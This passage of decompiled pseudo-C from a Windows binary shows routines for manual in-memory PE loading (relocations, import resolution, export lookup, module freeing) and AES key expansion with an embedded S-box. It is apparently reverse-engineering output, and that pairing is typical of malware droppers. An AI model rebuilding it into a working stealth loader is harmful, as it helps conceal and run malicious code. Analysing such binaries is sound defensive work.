            v13++;
            v10 += 2;
            v7 = v9;
            while (v13 < (v9 - 8) / 2) {
                // 0x40279d
                v12 = *(int16_t *)v10;
                v8 = v9;
                if ((v12 & -0x1000) == 0x3000) {
                    // 0x4027af
                    v14 = (int32_t *)(v11 + (int32_t)(v12 & 4095));
                    *v14 = *v14 + a2;
                    v8 = *v5;
                }
                // 0x4027bc
                v9 = v8;
                v13++;
                v10 += 2;
                v7 = v9;
            }
        }
        // 0x4027ce
        v15 = v7 + v17;
        v16 = *(int32_t *)v15;
    }
    // 0x4027dc
    return 1;
}

// Address range: 0x4027df - 0x402924
int32_t function_4027df(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x4027ec
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x4027ee
    if (*(int32_t *)(v1 + 132) == 0) {
        // 0x402920
        return 1;
    }
    int32_t lp = *(int32_t *)(v1 + 128) + v2; // 0x40280d
    int32_t v3 = lp; // bp-36, 0x402811
    if (IsBadReadPtr((int32_t *)lp, 20)) {
        // 0x402920
        return 1;
    }
    int32_t * v4 = (int32_t *)(a1 + 48);
    int32_t * v5 = (int32_t *)(a1 + 12);
    int32_t * v6 = (int32_t *)(a1 + 8);
    int32_t v7 = &v3;
    int32_t v8 = lp;
    int32_t v9 = *(int32_t *)(v8 + 12); // 0x402825
    int32_t result = 1; // 0x40282a
    int32_t v10; // 0x4027df
    int32_t * v11; // 0x4027df
    while (v9 != 0) {
        int32_t v12 = v7;
        v11 = (int32_t *)(v12 - 4);
        *v11 = *v4;
        int32_t v13 = v9 + v2; // 0x402833
        v7 = v12 - 8;
        int32_t * v14 = (int32_t *)v7;
        *v14 = v13;
        v10 = 126;
        if (v13 == 0) {
            goto lab_0x4028fd;
        }
        // 0x402846
        *v11 = 4 * *v5 + 4;
        *v14 = *v6;
        int32_t * mem = realloc((int32_t *)v13, (int32_t)&g54); // 0x402854
        if (mem == NULL) {
            // 0x4028f0
            *v11 = *v4;
            *v14 = v13;
            v10 = 14;
            goto lab_0x4028fd;
        }
        int32_t v15 = (int32_t)mem; // 0x402854
        *v6 = v15;
        *(int32_t *)(4 * *v5 + v15) = v13;
        *v5 = *v5 + 1;
        int32_t v16 = *(int32_t *)v8; // 0x402873
        int32_t v17; // 0x4027df
        int32_t v18; // 0x4027df
        if (v16 == 0) {
            int32_t v19 = *(int32_t *)(v8 + 16) + v2; // 0x402889
            v18 = v19;
            v17 = v19;
        } else {
            // 0x402879
            v18 = v16 + v2;
            v17 = *(int32_t *)(v8 + 16) + v2;
        }
        int32_t v20 = v18;
        int32_t * v21 = (int32_t *)v20; // 0x402891
        int32_t v22 = *v21; // 0x402891
        int32_t * lp2 = v21; // 0x402895
        if (v22 != 0) {
            int32_t v23 = v17; // 0x4027df
            int32_t dwErrCode = v20;
            int32_t v24 = v22;
            *v11 = *v4;
            int32_t v25 = v24 > -1 ? v2 + 2 + v24 : v24 & 0xffff;
            *v14 = v25;
            *(int32_t *)(v12 - 12) = v13;
            *(int32_t *)v23 = v25;
            if (v25 == 0) {
                // 0x402909
                *v14 = v13;
                *v11 = 127;
                SetLastError(dwErrCode);
                result = 0;
                return result;
            }
            int32_t v26 = dwErrCode + 4; // 0x4028c3
            int32_t * v27 = (int32_t *)v26;
            int32_t v28 = *v27; // 0x402891
            v23 += 4;
            lp2 = v27;
            while (v28 != 0) {
                // 0x402897
                dwErrCode = v26;
                v24 = v28;
                *v11 = *v4;
                v25 = v24 > -1 ? v2 + 2 + v24 : v24 & 0xffff;
                *v14 = v25;
                *(int32_t *)(v12 - 12) = v13;
                *(int32_t *)v23 = v25;
                if (v25 == 0) {
                    // 0x402909
                    *v14 = v13;
                    *v11 = 127;
                    SetLastError(dwErrCode);
                    result = 0;
                    return result;
                }
                // 0x4028c3
                v26 = dwErrCode + 4;
                v27 = (int32_t *)v26;
                v28 = *v27;
                v23 += 4;
                lp2 = v27;
            }
        }
        int32_t v29 = v8 + 20; // 0x4028d6
        *v11 = 20;
        *v14 = v29;
        bool v30 = IsBadReadPtr(lp2, (int32_t)&g54); // 0x4028dc
        result = 1;
        if (v30) {
            // break -> 0x402920
            break;
        }
        v8 = v29;
        v9 = *(int32_t *)(v8 + 12);
        result = 1;
    }
  lab_0x402920:
    // 0x402920
    return result;
  lab_0x4028fd:
    // 0x4028fd
    *v11 = v10;
    SetLastError((int32_t)&g54);
    result = 0;
    return result;
}

// Address range: 0x402924 - 0x4029cc
int32_t function_402924(int32_t a1, uint32_t a2) {
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x40292f
    int32_t v2 = *(int32_t *)a1; // 0x402932
    int32_t v3; // bp-20, 0x402924
    int32_t v4 = &v3; // 0x402937
    if (*(int32_t *)(v2 + 124) == 0) {
        // 0x4029a5
        *(int32_t *)(v4 - 4) = 127;
        SetLastError((int32_t)&g54);
        // 0x4029af
        return 0;
    }
    int32_t v5 = *(int32_t *)(v2 + 120) + v1;
    int32_t * v6 = (int32_t *)(v5 + 24);
    if (*v6 == 0) {
        // 0x4029a5
        *(int32_t *)(v4 - 4) = 127;
        SetLastError((int32_t)&g54);
        // 0x4029af
        return 0;
    }
    int32_t * v7 = (int32_t *)(v5 + 20); // 0x40294c
    int32_t v8 = *v7; // 0x40294c
    if (v8 == 0) {
        // 0x4029a5
        *(int32_t *)(v4 - 4) = 127;
        SetLastError((int32_t)&g54);
        // 0x4029af
        return 0;
    }
    int32_t v9; // 0x402924
    int32_t v10; // 0x402924
    if (a2 >= 0x10000) {
        int32_t v11 = *(int32_t *)(v5 + 32) + v1; // 0x402971
        int32_t v12 = *(int32_t *)(v5 + 36) + v1; // 0x402973
        int32_t * v13 = (int32_t *)(v4 - 4); // 0x402985
        *v13 = *(int32_t *)v11 + v1;
        int32_t * v14 = (int32_t *)(v4 - 8); // 0x402986
        *v14 = a2;
        int32_t v15 = _stricmp((char *)&g54, (char *)&g54); // 0x402989
        int32_t v16 = v11; // 0x402993
        int32_t v17 = v12; // 0x402993
        int32_t v18 = v12; // 0x402993
        if (v15 != 0) {
            int32_t v19 = 1; // 0x402995
            while (v19 < *v6) {
                int32_t v20 = v17 + 2; // 0x40299f
                int32_t v21 = v16 + 4; // 0x402998
                *v13 = *(int32_t *)v21 + v1;
                *v14 = a2;
                int32_t v22 = _stricmp((char *)&g54, (char *)&g54); // 0x402989
                v16 = v21;
                v17 = v20;
                v18 = v20;
                if (v22 == 0) {
                    goto lab_0x4029b4;
                }
                v19++;
            }
            // 0x4029a5
            *(int32_t *)(v4 - 4) = 127;
            SetLastError((int32_t)&g54);
            // 0x4029af
            return 0;
        }
      lab_0x4029b4:
        // 0x4029b4
        v9 = *v7;
        v10 = (int32_t)*(int16_t *)v18;
    } else {
        uint32_t v23 = a2 & 0xffff; // 0x40295c
        uint32_t v24 = *(int32_t *)(v5 + 16); // 0x402960
        if (v23 < v24) {
            // 0x4029a5
            *(int32_t *)(v4 - 4) = 127;
            SetLastError((int32_t)&g54);
            // 0x4029af
            return 0;
        }
        // 0x402967
        v9 = v8;
        v10 = v23 - v24;
    }
    // 0x4029ba
    if (v10 <= v9) {
        // 0x4029af
        return *(int32_t *)(4 * v10 + v1 + *(int32_t *)(v5 + 28)) + v1;
    }
    // 0x4029a5
    *(int32_t *)(v4 - 4) = 127;
    SetLastError((int32_t)&g54);
    // 0x4029af
    return 0;
}

// Address range: 0x4029cc - 0x402a46
int32_t function_4029cc(int32_t a1) {
    if (a1 == 0) {
        // 0x402a43
        int32_t result; // 0x4029cc
        return result;
    }
    // 0x4029d8
    int32_t v1; // bp-8, 0x4029cc
    int32_t * v2 = &v1; // 0x4029db
    if (*(int32_t *)(a1 + 16) != 0) {
        int32_t v3 = *(int32_t *)(a1 + 4); // bp-20, 0x4029e7
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    int32_t * v5 = (int32_t *)(a1 + 8); // 0x4029ec
    if (*v5 != 0) {
        int32_t * v6 = (int32_t *)(a1 + 12); // 0x4029f4
        int32_t v7 = *v6; // 0x4029f4
        int32_t * v8; // 0x4029cc
        if (v7 > 0) {
            int32_t * v9 = (int32_t *)(v4 - 8);
            int32_t v10 = 0; // 0x402a0c
            int32_t v11 = *(int32_t *)(*v5 + 4 * v10); // 0x4029fc
            int32_t v12 = v7; // 0x402a01
            if (v11 != 0) {
                // 0x402a03
                *v9 = *(int32_t *)(a1 + 48);
                *(int32_t *)(v4 - 12) = v11;
                v12 = *v6;
            }
            int32_t v13 = v12; // 0x402a0d
            v10++;
            v8 = v9;
            while (v10 < v13) {
                // 0x4029f9
                v11 = *(int32_t *)(*v5 + 4 * v10);
                v12 = v13;
                if (v11 != 0) {
                    // 0x402a03
                    *v9 = *(int32_t *)(a1 + 48);
                    *(int32_t *)(v4 - 12) = v11;
                    v12 = *v6;
                }
                // 0x402a0c
                v13 = v12;
                v10++;
                v8 = v9;
            }
        } else {
            // 0x4029f1
            v8 = (int32_t *)(v4 - 8);
        }
        // 0x402a12
        *v8 = *v5;
        free(&g54);
    }
    int32_t v14 = *(int32_t *)(a1 + 4); // 0x402a1d
    int32_t * v15; // 0x4029cc
    int32_t * v16; // 0x4029cc
    int32_t * v17; // 0x4029cc
    if (v14 == 0) {
        // 0x402a1d
        v15 = (int32_t *)(v4 - 12);
        v17 = (int32_t *)(v4 - 8);
        v16 = (int32_t *)(v4 - 4);
    } else {
        int32_t * v18 = (int32_t *)(v4 - 4);
        *v18 = *(int32_t *)(a1 + 48);
        int32_t * v19 = (int32_t *)(v4 - 8);
        *v19 = 0x8000;
        int32_t * v20 = (int32_t *)(v4 - 12);
        *v20 = 0;
        *(int32_t *)(v4 - 16) = v14;
        v15 = v20;
        v17 = v19;
        v16 = v18;
    }
    // 0x402a34
    *v16 = a1;
    *v17 = 0;
    *v15 = (int32_t)GetProcessHeap();
    // 0x402a43
    return HeapFree(&g54, (int32_t)&g54, &g54);
}

// Address range: 0x402a46 - 0x402a53
int32_t function_402a46(void) {
    // 0x402a46
    int32_t result; // 0x402a46
    *(char *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x402a6f - 0x402a76
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ2(void) {
    // 0x402a6f
    int32_t result; // 0x402a6f
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x402a76 - 0x402e7e
// Used cryptographic patterns:
//  - AES_Rijndael_S___ARIA_S1 (8-bit)
int32_t function_402a76(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x402a76
    int32_t v1; // bp-24, 0x402a76
    if (a1 == NULL) {
        // 0x402a87
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v1);
        _CxxThrowException(&v1, &g17);
        // UNREACHABLE
    }
    switch (a5) {
        case 16: {
            goto lab_0x402ae1;
        }
        case 32: {
            goto lab_0x402ae1;
        }
        case 24: {
            goto lab_0x402ae1;
        }
        default: {
            // 0x402abf
            _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v1);
            _CxxThrowException(&v1, &g17);
            // UNREACHABLE
        }
    }
  lab_0x402ae1:
    switch (a6) {
        case 16: {
            goto lab_0x402b13;
        }
        case 32: {
            goto lab_0x402b13;
        }
        case 24: {
            goto lab_0x402b13;
        }
        default: {
            // 0x402af1
            _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v1);
            _CxxThrowException(&v1, &g17);
            // UNREACHABLE
        }
    }
  lab_0x402b13:;
    // 0x402b13
    int32_t v2; // 0x402a76
    int32_t * v3 = (int32_t *)(v2 + 972); // 0x402b14
    *v3 = a6;
    int32_t * v4 = (int32_t *)(v2 + 968); // 0x402b23
    *v4 = a5;
    int32_t * v5 = (int32_t *)a4; // 0x402b2a
    memcpy((int32_t *)(v2 + 976), v5, a6);
    memcpy((int32_t *)(v2 + 1008), v5, *v3);
    int32_t * v6; // 0x402a76
    int32_t v7; // 0x402a76
    int32_t v8; // 0x402a76
    int32_t v9; // 0x402a76
    switch (*v4) {
        case 16: {
            int32_t v10 = *v3; // 0x402b75
            v9 = 10;
            if (v10 != 16) {
                // 0x402b84
                v9 = v10 == 24 ? 12 : 14;
            }
            goto lab_0x402b94;
        }
        case 24: {
            // 0x402b61
            v9 = *v3 == 32 ? 14 : 12;
            goto lab_0x402b94;
        }
        default: {
            int32_t v11 = v2 + 1040;
            int32_t * v12 = (int32_t *)v11;
            *v12 = 14;
            v8 = 14;
            v6 = v12;
            v7 = v11;
            goto lab_0x402bb3;
        }
    }
  lab_0x402bb3:;
    int32_t v13 = a3 & 255;
    int32_t v14 = a2 & 255;
    uint32_t v15 = *v3; // 0x402b9a
    int64_t v16 = (0x100000000 * (int64_t)(v15 / 0x80000000) | (int64_t)v15) / 4; // 0x402ba4
    uint32_t v17 = (int32_t)v16; // 0x402ba4
    int32_t v18 = v2 + 8;
    int32_t v19 = v8; // 0x402bbb
    if (v17 >= 1) {
        // 0x402bbd
        __asm_rep_stosd_memset((char *)v18, 0, v17);
        v19 = *v6;
    }
    int32_t v20 = v19;
    int32_t v21 = 1; // 0x402bc3
    int32_t v22 = v21; // 0x402bcd
    int32_t v23 = v18 + 32; // 0x402bcd
    while (v21 <= v20) {
        // 0x402bb6
        v18 = v23;
        v19 = v20;
        if (v17 >= 1) {
            // 0x402bbd
            __asm_rep_stosd_memset((char *)v18, 0, v17);
            v19 = *v6;
        }
        // 0x402bc3
        v20 = v19;
        v21 = v22 + 1;
        v22 = v21;
        v23 = v18 + 32;
    }
    int32_t v24 = v20; // 0x402bd7
    if (v20 >= 0) {
        int32_t v25 = 0; // 0x402bd9
        int32_t v26 = v2 + 488;
        int32_t v27 = v20; // 0x402be4
        if (v17 >= 1) {
            // 0x402be6
            __asm_rep_stosd_memset((char *)v26, 0, v17);
            v27 = *v6;
        }
        int32_t v28 = v27; // 0x402bf0
        v25++;
        int32_t v29 = v26 + 32; // 0x402bf6
        v24 = v28;
        while (v25 <= v28) {
            // 0x402bdf
            v26 = v29;
            v27 = v28;
            if (v17 >= 1) {
                // 0x402be6
                __asm_rep_stosd_memset((char *)v26, 0, v17);
                v27 = *v6;
            }
            // 0x402bec
            v28 = v27;
            v25++;
            v29 = v26 + 32;
            v24 = v28;
        }
    }
    uint32_t v30 = *v4; // 0x402bf8
    int32_t v31; // bp-36, 0x402a76
    int32_t v32 = &v31; // 0x402c01
    uint32_t v33 = (int32_t)((0x100000000 * (int64_t)(v30 / 0x80000000) | (int64_t)v30) / 4); // 0x402c08
    uint32_t v34 = (v24 + 1) * v17; // 0x402c0e
    int32_t v35 = 0; // 0x402c22
    if (v33 < 1) {
      lab_0x402ca5:
        // 0x402ca5
        if (v35 < v34) {
            char * v36 = (char *)(v14 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x402cca
            char * v37 = (char *)(v13 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x402cfc
            int32_t v38 = v2 + 1044; // 0x402d05
            int32_t * v39 = (int32_t *)v38; // 0x402d05
            int32_t v40 = v2 + 1048;
            int32_t * v41 = (int32_t *)(v32 - 4);
            int32_t * v42 = (int32_t *)(v2 + 1060);
            int64_t v43 = v16 & 0xffffffff;
            char * v44 = (char *)&g7; // 0x402a76
            uint32_t v45 = *(int32_t *)(4 * v33 + v7); // 0x402cb5
            char v46 = *v44; // 0x402cc7
            char v47 = *v36; // 0x402cca
            unsigned char v48 = *(char *)((v45 / 256 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x402cdf
            unsigned char v49 = *(char *)((v45 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x402ce6
            unsigned char v50 = *v37; // 0x402cfc
            int32_t v51 = *v39; // 0x402d05
            int32_t v52 = (256 * (256 * (256 * (int32_t)(v47 ^ v46) | (int32_t)v48) | (int32_t)v49) | (int32_t)v50) ^ v51; // 0x402d05
            *v39 = v52;
            int32_t v53; // 0x402a76
            int32_t v54; // 0x402a76
            int32_t v55; // 0x402a76
            int32_t v56; // 0x402a76
            int32_t v57; // 0x402a76
            int32_t v58; // 0x402d9f
            int32_t v59; // 0x402da4
            int32_t * v60; // 0x402d3e
            int32_t v61; // 0x402d3e
            int32_t v62; // 0x402d43
            int32_t * v63; // 0x402d28
            int32_t v64; // 0x402d28
            int32_t v65; // 0x402d2d
            uint32_t v66; // 0x402d46
            char v67; // 0x402d5b
            unsigned char v68; // 0x402d62
            unsigned char v69; // 0x402d7a
            unsigned char v70; // 0x402d81
            int32_t v71; // 0x402d95
            int32_t v72; // 0x402d95
            int32_t * v73; // 0x402d9f
            if (v33 == 8) {
                // 0x402d32
                *v41 = 3;
                v61 = *v39;
                v55 = v40;
                v62 = 3;
                v60 = (int32_t *)v55;
                v61 ^= *v60;
                *v60 = v61;
                v62--;
                v55 += 4;
                while (v62 != 0) {
                    // 0x402d3b
                    v60 = (int32_t *)v55;
                    v61 ^= *v60;
                    *v60 = v61;
                    v62--;
                    v55 += 4;
                }
                // 0x402d46
                v66 = *(int32_t *)(v2 + 1056);
                *v41 = 3;
                v67 = *v37;
                v68 = *v36;
                v69 = *(char *)((v66 / 256 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v70 = *(char *)((v66 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v71 = *v42;
                v72 = (256 * (256 * (256 * (int32_t)v67 | (int32_t)v68) | (int32_t)v69) | (int32_t)v70) ^ v71;
                *v42 = v72;
                v58 = v72;
                v56 = v2 + 1064;
                v59 = *v41;
                v73 = (int32_t *)v56;
                v58 ^= *v73;
                *v73 = v58;
                v59--;
                v56 += 4;
                while (v59 != 0) {
                    // 0x402d9c
                    v73 = (int32_t *)v56;
                    v58 ^= *v73;
                    *v73 = v58;
                    v59--;
                    v56 += 4;
                }
            } else {
                // 0x402d13
                v53 = v52;
                v54 = v40;
                if (v33 >= 2) {
                    v63 = (int32_t *)v54;
                    v64 = *v63 ^ v53;
                    *v63 = v64;
                    v65 = v33 - 2;
                    v53 = v64;
                    v54 += 4;
                    v57 = v65;
                    while (v65 != 0) {
                        // 0x402d25
                        v63 = (int32_t *)v54;
                        v64 = *v63 ^ v53;
                        *v63 = v64;
                        v65 = v57 - 1;
                        v53 = v64;
                        v54 += 4;
                        v57 = v65;
                    }
                }
            }
            int32_t v74 = v38; // 0x402dad
            int32_t v75 = v35; // 0x402dad
            int32_t v76; // 0x402a76
            uint32_t v77; // 0x402a76
            int32_t * v78; // 0x402dbd
            int64_t v79; // 0x402dc0
            int32_t v80; // 0x402dc0
            int32_t v81; // 0x402dc9
            int32_t v82; // 0x402ddb
            int32_t v83; // 0x402de9
            if (v33 >= 1) {
                v77 = v35;
                if (v77 >= v34) {
                    // break (via goto) -> 0x402e04
                    goto lab_0x402e04;
                }
                // 0x402dba
                v78 = (int32_t *)v74;
                v79 = 0x100000000 * (int64_t)(v77 / 0x80000000) | (int64_t)v77;
                v80 = v79 / v43;
                v81 = v79 % v43;
                *(int32_t *)(v2 + 8 + 4 * (8 * v80 + v81)) = *v78;
                v82 = 1;
                v83 = v77 + 1;
                *(int32_t *)(v2 + 488 + 4 * (8 * (*v6 - v80) + v81)) = *v78;
                v76 = v82;
                v74 += 4;
                v75 = v83;
                while (v82 < v33) {
                    // 0x402db5
                    v77 = v83;
                    if (v77 >= v34) {
                        // break (via goto) -> 0x402e04
                        goto lab_0x402e04;
                    }
                    // 0x402dba
                    v78 = (int32_t *)v74;
                    v79 = 0x100000000 * (int64_t)(v77 / 0x80000000) | (int64_t)v77;
                    v80 = v79 / v43;
                    v81 = v79 % v43;
                    *(int32_t *)(v2 + 8 + 4 * (8 * v80 + v81)) = *v78;
                    v82 = v76 + 1;
                    v83 = v77 + 1;
                    *(int32_t *)(v2 + 488 + 4 * (8 * (*v6 - v80) + v81)) = *v78;
                    v76 = v82;
                    v74 += 4;
                    v75 = v83;
                }
            }
            int32_t v84 = v75;
            v44 = (char *)((int32_t)v44 + 1);
            while (v84 < v34) {
                // 0x402cb5
                v45 = *(int32_t *)(4 * v33 + v7);
                v46 = *v44;
                v47 = *v36;
